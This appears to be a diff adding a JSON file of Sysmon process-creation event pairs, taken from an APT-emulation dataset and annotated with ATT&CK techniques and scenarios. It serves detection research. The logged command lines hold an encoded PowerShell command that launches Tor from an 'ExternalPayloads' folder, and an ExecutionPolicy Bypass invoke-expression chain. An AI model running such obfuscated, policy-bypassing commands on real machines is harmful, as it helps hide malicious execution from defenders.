@@ -1,0 +1,2209 @@
+{
+  "limitation": "Observed relationships are exploratory evidence, not alerts, malicious causality, or independent ground truth.",
+  "method": "Distinct Sysmon process-creation documents, host plus GUID ancestry, explicit nanosecond time, inclusive windows. No labels or scenarios in joins. Chain object confirmation uses unindexed original imagePath only for review.",
+  "pair_examples": {
+    "T1059.001->T1059.003": [
+      {
+        "event_ids": [
+          "0695e16a8cd4e4073d92a1ad21c048d09e1a9216565b4c7e4aba7e02bec0ffb2",
+          "85c8d92c34d08a480878e14ba75e56e0b7a7ea0f1a0e094ce4ef09d40502f443"
+        ],
+        "events": [
+          {
+            "@timestamp": "2024-12-03T13:02:00.511405400Z",
+            "agent": {
+              "id": "003",
+              "name": "window-agent3"
+            },
+            "event": {
+              "code": "1",
+              "id": "0695e16a8cd4e4073d92a1ad21c048d09e1a9216565b4c7e4aba7e02bec0ffb2",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-QGB4EQH"
+            },
+            "process": {
+              "command_line": "powershell  -encodedCommand YwBtAGQAIAAvAGMAIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdABvAHIAXABUAG8AcgBcAHQAbwByAC4AZQB4AGUAIgA= -inputFormat xml -outputFormat text",
+              "entity_id": "{15959494-0148-674F-AF12-000000001500}",
+              "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+              "hash": {
+                "md5": "95000560239032bc68b4c2fdfcdef913",
+                "sha1": "1b3b40fbc889fd4c645cc12c85d0805ac36ba254",
+                "sha256": "d3f8fade829d2b7bd596c4504a6dae5c034e789b6a3defbe013bda7d14466677"
+              },
+              "name": "powershell.exe",
+              "parent": {
+                "command_line": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c start powershell -encodedCommand YwBtAGQAIAAvAGMAIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdABvAHIAXABUAG8AcgBcAHQAbwByAC4AZQB4AGUAIgA= -inputFormat xml -outputFormat text",
+                "entity_id": "{15959494-0148-674F-AE12-000000001500}",
+                "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                "name": "cmd.exe",
+                "pid": 3376
+              },
+              "pid": 9428
+            },
+            "user": {
+              "domain": "DESKTOP-QGB4EQH",
+              "name": "mari"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1087",
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Account Discovery",
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Discovery",
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 60714,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "eaqdjJMBgaXk-6ahCUlO",
+                "original_index": "wazuh-alerts-4.x-2024.12.03",
+                "processing_version": "1.0.0",
+                "row_sha256": "ff3fd52f73bf5e2fc7eca578112524d5512b07a1c0a4965ce9cd67d54301e4bb",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/03-04-December.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 4048,
+                "source_sha256": "91d005371ccce593a61c15dbde1a6780bfadaa5564304f3a20b8733d850b8d35"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S34",
+                "name": "Rocke"
+              }
+            }
+          },
+          {
+            "@timestamp": "2024-12-03T13:02:03.902994200Z",
+            "agent": {
+              "id": "003",
+              "name": "window-agent3"
+            },
+            "event": {
+              "code": "1",
+              "id": "85c8d92c34d08a480878e14ba75e56e0b7a7ea0f1a0e094ce4ef09d40502f443",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-QGB4EQH"
+            },
+            "process": {
+              "command_line": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\tor\\\\Tor\\\\tor.exe",
+              "entity_id": "{15959494-014B-674F-B812-000000001500}",
+              "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "hash": {
+                "md5": "4e2acf4f8a396486ab4268c94a6a245f",
+                "sha1": "3ce71813199abae99348f61f0caa34e2574f831c",
+                "sha256": "9a7c58bd98d70631aa1473f7b57b426db367d72429a5455b433a05ee251f3236"
+              },
+              "name": "cmd.exe",
+              "parent": {
+                "command_line": "powershell  -encodedCommand YwBtAGQAIAAvAGMAIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdABvAHIAXABUAG8AcgBcAHQAbwByAC4AZQB4AGUAIgA= -inputFormat xml -outputFormat text",
+                "entity_id": "{15959494-0148-674F-AF12-000000001500}",
+                "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                "name": "powershell.exe",
+                "pid": 9428
+              },
+              "pid": 4628
+            },
+            "user": {
+              "domain": "DESKTOP-QGB4EQH",
+              "name": "mari"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 96680,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "e6qdjJMBgaXk-6ahGEnw",
+                "original_index": "wazuh-alerts-4.x-2024.12.03",
+                "processing_version": "1.0.0",
+                "row_sha256": "7f3a1ea1ceed9d3a6a3cfd4ce39cc95ae5a6e37545589ecd5c5a65e34ef3fc1c",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/03-04-December.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 6491,
+                "source_sha256": "91d005371ccce593a61c15dbde1a6780bfadaa5564304f3a20b8733d850b8d35"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S07",
+                "name": "APT41"
+              }
+            }
+          }
+        ],
+        "explicit_utc": true,
+        "gap_nanoseconds": 3391588800,
+        "gap_seconds": 3.3915888,
+        "host": "DESKTOP-QGB4EQH",
+        "join": "same host; parent.process.entity_id = child.process.parent.entity_id"
+      },
+      {
+        "event_ids": [
+          "09c9975fd9fdc6cd89b0819afb011643363d00b6a16a8de63358a18c48cca66f",
+          "d6348da9f4ac3e16b8987dd260c75dd1415fe9a02aabea0567b67b07910f653b"
+        ],
+        "events": [
+          {
+            "@timestamp": "2024-11-07T13:34:10.658575Z",
+            "agent": {
+              "id": "2",
+              "name": "wazuh-agent"
+            },
+            "event": {
+              "code": "1",
+              "id": "09c9975fd9fdc6cd89b0819afb011643363d00b6a16a8de63358a18c48cca66f",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-FMI6MML"
+            },
+            "process": {
+              "command_line": "powershell  -encodedCommand YwBtAGQAIAAvAGMAIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdABvAHIAXABUAG8AcgBcAHQAbwByAC4AZQB4AGUAIgA= -inputFormat xml -outputFormat text",
+              "entity_id": "{D8AF36FB-C1D2-672C-8D07-000000000400}",
+              "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+              "hash": {
+                "md5": "95000560239032bc68b4c2fdfcdef913",
+                "sha256": "d3f8fade829d2b7bd596c4504a6dae5c034e789b6a3defbe013bda7d14466677"
+              },
+              "name": "powershell.exe",
+              "parent": {
+                "command_line": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c start powershell -encodedCommand YwBtAGQAIAAvAGMAIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdABvAHIAXABUAG8AcgBcAHQAbwByAC4AZQB4AGUAIgA= -inputFormat xml -outputFormat text",
+                "entity_id": "{D8AF36FB-C1D2-672C-8C07-000000000400}",
+                "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                "name": "cmd.exe",
+                "pid": 6216
+              },
+              "pid": 1632
+            },
+            "user": {
+              "domain": "DESKTOP-FMI6MML",
+              "name": "maryam"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1087",
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Account Discovery",
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Discovery",
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 99714,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "L9vVBpMBLF98WFwuRwtR",
+                "original_index": "wazuh-alerts-4.x-2024.11.07",
+                "processing_version": "1.0.0",
+                "row_sha256": "fe994c7b127c2217f1207c70deb1b5509f9c6666316a7bca63d2190e69c3ef02",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/1-11-November.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 7279,
+                "source_sha256": "e60f822890dab491a7a189c549c873a52d56f52c3dc31c125923917014a56900"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S34",
+                "name": "Rocke"
+              }
+            }
+          },
+          {
+            "@timestamp": "2024-11-07T13:34:12.819345800Z",
+            "agent": {
+              "id": "2",
+              "name": "wazuh-agent"
+            },
+            "event": {
+              "code": "1",
+              "id": "d6348da9f4ac3e16b8987dd260c75dd1415fe9a02aabea0567b67b07910f653b",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-FMI6MML"
+            },
+            "process": {
+              "command_line": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\tor\\\\Tor\\\\tor.exe",
+              "entity_id": "{D8AF36FB-C1D4-672C-8F07-000000000400}",
+              "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "hash": {
+                "md5": "4e2acf4f8a396486ab4268c94a6a245f",
+                "sha256": "9a7c58bd98d70631aa1473f7b57b426db367d72429a5455b433a05ee251f3236"
+              },
+              "name": "cmd.exe",
+              "parent": {
+                "command_line": "powershell  -encodedCommand YwBtAGQAIAAvAGMAIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdABvAHIAXABUAG8AcgBcAHQAbwByAC4AZQB4AGUAIgA= -inputFormat xml -outputFormat text",
+                "entity_id": "{D8AF36FB-C1D2-672C-8D07-000000000400}",
+                "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                "name": "powershell.exe",
+                "pid": 1632
+              },
+              "pid": 2680
+            },
+            "user": {
+              "domain": "DESKTOP-FMI6MML",
+              "name": "maryam"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 99738,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "MdvVBpMBLF98WFwuRwtR",
+                "original_index": "wazuh-alerts-4.x-2024.11.07",
+                "processing_version": "1.0.0",
+                "row_sha256": "b6ba9c733593030c37ab1f3fdc942324c7a2889df05a66acd35ff8ebf8136224",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/1-11-November.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 7280,
+                "source_sha256": "e60f822890dab491a7a189c549c873a52d56f52c3dc31c125923917014a56900"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S07",
+                "name": "APT41"
+              }
+            }
+          }
+        ],
+        "explicit_utc": true,
+        "gap_nanoseconds": 2160770800,
+        "gap_seconds": 2.1607708,
+        "host": "DESKTOP-FMI6MML",
+        "join": "same host; parent.process.entity_id = child.process.parent.entity_id"
+      },
+      {
+        "event_ids": [
+          "0accbc74988397aff4c54513c5130ea45468a7462e56368ad99dd9bf442cdc75",
+          "360d4763480f237923a347984001eb7fd566e1b83a40e920ca2fa5675f9ff60d"
+        ],
+        "events": [
+          {
+            "@timestamp": "2024-12-10T10:16:21.256709900Z",
+            "agent": {
+              "id": "3",
+              "name": "window-agent3"
+            },
+            "event": {
+              "code": "1",
+              "id": "0accbc74988397aff4c54513c5130ea45468a7462e56368ad99dd9bf442cdc75",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-QGB4EQH"
+            },
+            "process": {
+              "command_line": "powershell  -encodedCommand YwBtAGQAIAAvAGMAIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdABvAHIAXABUAG8AcgBcAHQAbwByAC4AZQB4AGUAIgA= -inputFormat xml -outputFormat text",
+              "entity_id": "{15959494-14F5-6758-A848-000000001E00}",
+              "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+              "hash": {
+                "md5": "95000560239032bc68b4c2fdfcdef913",
+                "sha1": "1b3b40fbc889fd4c645cc12c85d0805ac36ba254",
+                "sha256": "d3f8fade829d2b7bd596c4504a6dae5c034e789b6a3defbe013bda7d14466677"
+              },
+              "name": "powershell.exe",
+              "parent": {
+                "command_line": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c start powershell -encodedCommand YwBtAGQAIAAvAGMAIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdABvAHIAXABUAG8AcgBcAHQAbwByAC4AZQB4AGUAIgA= -inputFormat xml -outputFormat text",
+                "entity_id": "{15959494-14F5-6758-A748-000000001E00}",
+                "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                "name": "cmd.exe",
+                "pid": 14368
+              },
+              "pid": 10188
+            },
+            "user": {
+              "domain": "DESKTOP-QGB4EQH",
+              "name": "mari"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1087",
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Account Discovery",
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Discovery",
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 47222,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "DMcRsJMBnOFSf1ly7DxN",
+                "original_index": "wazuh-alerts-4.x-2024.12.10",
+                "processing_version": "1.0.0",
+                "row_sha256": "906a92b7d1bf89e97b06335befffd2afd996abc551eb4693f071a21c5ad86806",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/10-December-P1.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 2254,
+                "source_sha256": "896eb72630932598192628f72012ce749786868cc2d1f7217937e555ab588229"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S34",
+                "name": "Rocke"
+              }
+            }
+          },
+          {
+            "@timestamp": "2024-12-10T10:16:22.164095400Z",
+            "agent": {
+              "id": "3",
+              "name": "window-agent3"
+            },
+            "event": {
+              "code": "1",
+              "id": "360d4763480f237923a347984001eb7fd566e1b83a40e920ca2fa5675f9ff60d",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-QGB4EQH"
+            },
+            "process": {
+              "command_line": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\tor\\\\Tor\\\\tor.exe",
+              "entity_id": "{15959494-14F6-6758-B448-000000001E00}",
+              "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "hash": {
+                "md5": "4e2acf4f8a396486ab4268c94a6a245f",
+                "sha1": "3ce71813199abae99348f61f0caa34e2574f831c",
+                "sha256": "9a7c58bd98d70631aa1473f7b57b426db367d72429a5455b433a05ee251f3236"
+              },
+              "name": "cmd.exe",
+              "parent": {
+                "command_line": "powershell  -encodedCommand YwBtAGQAIAAvAGMAIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdABvAHIAXABUAG8AcgBcAHQAbwByAC4AZQB4AGUAIgA= -inputFormat xml -outputFormat text",
+                "entity_id": "{15959494-14F5-6758-A848-000000001E00}",
+                "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                "name": "powershell.exe",
+                "pid": 10188
+              },
+              "pid": 14616
+            },
+            "user": {
+              "domain": "DESKTOP-QGB4EQH",
+              "name": "mari"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 47246,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "DscRsJMBnOFSf1ly7DxN",
+                "original_index": "wazuh-alerts-4.x-2024.12.10",
+                "processing_version": "1.0.0",
+                "row_sha256": "a701a8defb313350cf37a85b2ffc0096d3c6a17c7a96d63efb30d06509b901de",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/10-December-P1.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 2255,
+                "source_sha256": "896eb72630932598192628f72012ce749786868cc2d1f7217937e555ab588229"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S07",
+                "name": "APT41"
+              }
+            }
+          }
+        ],
+        "explicit_utc": true,
+        "gap_nanoseconds": 907385500,
+        "gap_seconds": 0.9073855,
+        "host": "DESKTOP-QGB4EQH",
+        "join": "same host; parent.process.entity_id = child.process.parent.entity_id"
+      }
+    ],
+    "T1059.003->T1059.001": [
+      {
+        "event_ids": [
+          "01ea2e887c88adf9d4b6a5edf353af461617e8372ebfe98f63b117460e79b760",
+          "32be01ebebaa05d0b83cb068bbcab36b41c24a1a48ca750d33bed090f68bb51a"
+        ],
+        "events": [
+          {
+            "@timestamp": "2024-12-09T23:27:23.322813Z",
+            "agent": {
+              "id": "3",
+              "name": "window-agent3"
+            },
+            "event": {
+              "code": "1",
+              "id": "01ea2e887c88adf9d4b6a5edf353af461617e8372ebfe98f63b117460e79b760",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-QGB4EQH"
+            },
+            "process": {
+              "command_line": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c start powershell -encodedCommand YwBtAGQAIAAvAGMAIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdABvAHIAXABUAG8AcgBcAHQAbwByAC4AZQB4AGUAIgA= -inputFormat xml -outputFormat text",
+              "entity_id": "{15959494-7CDB-6757-181B-000000001E00}",
+              "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "hash": {
+                "md5": "4e2acf4f8a396486ab4268c94a6a245f",
+                "sha1": "3ce71813199abae99348f61f0caa34e2574f831c",
+                "sha256": "9a7c58bd98d70631aa1473f7b57b426db367d72429a5455b433a05ee251f3236"
+              },
+              "name": "cmd.exe",
+              "parent": {
+                "command_line": "powershell.exe -ExecutionPolicy Bypass -C \\\"invoke-expression 'cmd /c start powershell -Command {cmd /c \\\\\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\tor\\\\Tor\\\\tor.exe\\\\\\\"}'; sleep -s 60; stop-process -name \\\\\\\"tor\\\\\\\" | out-null\\\"",
+                "entity_id": "{15959494-7CDA-6757-0C1B-000000001E00}",
+                "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                "name": "powershell.exe",
+                "pid": 9320
+              },
+              "pid": 9748
+            },
+            "user": {
+              "domain": "DESKTOP-QGB4EQH",
+              "name": "mari"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 70133,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "4ce_rZMBnOFSf1ly0iSe",
+                "original_index": "wazuh-alerts-4.x-2024.12.09",
+                "processing_version": "1.0.0",
+                "row_sha256": "787aaa8fae24d67d6003bb7be377bb1abda6b45b8d8335ea202f7b8e09de3e06",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/10-December-P1.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 3475,
+                "source_sha256": "896eb72630932598192628f72012ce749786868cc2d1f7217937e555ab588229"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S07",
+                "name": "APT41"
+              }
+            }
+          },
+          {
+            "@timestamp": "2024-12-09T23:27:23.376916100Z",
+            "agent": {
+              "id": "3",
+              "name": "window-agent3"
+            },
+            "event": {
+              "code": "1",
+              "id": "32be01ebebaa05d0b83cb068bbcab36b41c24a1a48ca750d33bed090f68bb51a",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-QGB4EQH"
+            },
+            "process": {
+              "command_line": "powershell  -encodedCommand YwBtAGQAIAAvAGMAIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdABvAHIAXABUAG8AcgBcAHQAbwByAC4AZQB4AGUAIgA= -inputFormat xml -outputFormat text",
+              "entity_id": "{15959494-7CDB-6757-191B-000000001E00}",
+              "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+              "hash": {
+                "md5": "95000560239032bc68b4c2fdfcdef913",
+                "sha1": "1b3b40fbc889fd4c645cc12c85d0805ac36ba254",
+                "sha256": "d3f8fade829d2b7bd596c4504a6dae5c034e789b6a3defbe013bda7d14466677"
+              },
+              "name": "powershell.exe",
+              "parent": {
+                "command_line": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c start powershell -encodedCommand YwBtAGQAIAAvAGMAIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdABvAHIAXABUAG8AcgBcAHQAbwByAC4AZQB4AGUAIgA= -inputFormat xml -outputFormat text",
+                "entity_id": "{15959494-7CDB-6757-181B-000000001E00}",
+                "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                "name": "cmd.exe",
+                "pid": 9748
+              },
+              "pid": 9936
+            },
+            "user": {
+              "domain": "DESKTOP-QGB4EQH",
+              "name": "mari"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1087",
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Account Discovery",
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Discovery",
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 131800,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "4se_rZMBnOFSf1ly0iSe",
+                "original_index": "wazuh-alerts-4.x-2024.12.09",
+                "processing_version": "1.0.0",
+                "row_sha256": "fad4346d41b65b31224a4840a4401e25e1ee98d88f42d91c3c741e87983de984",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/10-December-P1.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 6548,
+                "source_sha256": "896eb72630932598192628f72012ce749786868cc2d1f7217937e555ab588229"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S34",
+                "name": "Rocke"
+              }
+            }
+          }
+        ],
+        "explicit_utc": true,
+        "gap_nanoseconds": 54103100,
+        "gap_seconds": 0.0541031,
+        "host": "DESKTOP-QGB4EQH",
+        "join": "same host; parent.process.entity_id = child.process.parent.entity_id"
+      },
+      {
+        "event_ids": [
+          "02f61bfd90fb07ebe9d617a930fff23bc06996115d3b7c575811a19b81ea49f7",
+          "3f17482439b937ce1b652c47e78e9542a934318bcf2afe599ae49951b7c170b3"
+        ],
+        "events": [
+          {
+            "@timestamp": "2024-12-03T08:28:58.792984600Z",
+            "agent": {
+              "id": "003",
+              "name": "window-agent3"
+            },
+            "event": {
+              "code": "1",
+              "id": "02f61bfd90fb07ebe9d617a930fff23bc06996115d3b7c575811a19b81ea49f7",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-QGB4EQH"
+            },
+            "process": {
+              "command_line": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c start powershell -encodedCommand YwBtAGQAIAAvAGMAIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdABvAHIAXABUAG8AcgBcAHQAbwByAC4AZQB4AGUAIgA= -inputFormat xml -outputFormat text",
+              "entity_id": "{15959494-C14A-674E-4502-000000001500}",
+              "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "hash": {
+                "md5": "4e2acf4f8a396486ab4268c94a6a245f",
+                "sha1": "3ce71813199abae99348f61f0caa34e2574f831c",
+                "sha256": "9a7c58bd98d70631aa1473f7b57b426db367d72429a5455b433a05ee251f3236"
+              },
+              "name": "cmd.exe",
+              "parent": {
+                "command_line": "powershell.exe -ExecutionPolicy Bypass -C \\\"invoke-expression 'cmd /c start powershell -Command {cmd /c \\\\\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\tor\\\\Tor\\\\tor.exe\\\\\\\"}'; sleep -s 60; stop-process -name \\\\\\\"tor\\\\\\\" | out-null\\\"",
+                "entity_id": "{15959494-C14A-674E-4102-000000001500}",
+                "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                "name": "powershell.exe",
+                "pid": 3436
+              },
+              "pid": 4968
+            },
+            "user": {
+              "domain": "DESKTOP-QGB4EQH",
+              "name": "mari"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 46293,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "uqqji5MBgaXk-6ahKz-L",
+                "original_index": "wazuh-alerts-4.x-2024.12.03",
+                "processing_version": "1.0.0",
+                "row_sha256": "5bcc17b814e40802d801e0da2b8c36a823c51f52fe03ad5420af77303a2ee7a0",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/03-04-December.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 3155,
+                "source_sha256": "91d005371ccce593a61c15dbde1a6780bfadaa5564304f3a20b8733d850b8d35"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S07",
+                "name": "APT41"
+              }
+            }
+          },
+          {
+            "@timestamp": "2024-12-03T08:28:58.846763100Z",
+            "agent": {
+              "id": "003",
+              "name": "window-agent3"
+            },
+            "event": {
+              "code": "1",
+              "id": "3f17482439b937ce1b652c47e78e9542a934318bcf2afe599ae49951b7c170b3",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
